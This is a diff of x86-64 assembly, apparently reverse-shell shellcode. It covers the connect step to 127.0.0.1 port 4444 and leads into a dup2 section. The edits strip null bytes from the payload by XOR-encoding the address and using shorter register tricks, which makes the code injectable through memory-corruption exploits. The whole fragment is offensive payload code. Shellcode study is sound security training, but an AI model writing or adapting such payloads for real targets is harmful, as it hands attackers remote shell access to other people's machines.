@@ -31,7 +31,6 @@ connect:
     ; server.sin_port = htons(4444);    unsigned short
     ; server.sin_addr.s_addr = inet_addr("127.0.0.1");    unsigned long
     ; bzero(&server.sin_zero, 8);
-    ; AF_INET = 2
     ;
     ; https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
     ; struct sockaddr_in {
@@ -42,19 +41,22 @@ connect:
     ; };
     ;
     ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
+    ; AF_INET = 2
     ; __NR_connect = 42
+    ; On success, zero is returned
 
-    xor rax, rax
-    push rax          ; bzero()
-    mov dword [rsp-4], 0x0100007f
-    sub rsp, 4
+    xor eax, eax
+    push rax          ; sin_zero
+    push 0x10ffff70   ; sin_addr (xored)
+    xor dword [rsp], 0x11ffff0f ; recover sin_addr
     push word 0x5c11  ; htons(4444)
     push word 2
 
     ; connect
-    mov rax, 42
-    mov rsi, rsp
-    mov rdx, 16  ; sizeof(sockaddr_in)
+    add al, 42
+    push rsp
+    pop rsi
+    add dl, 16    ; sizeof(sockaddr_in)
     syscall
 
 dup2:
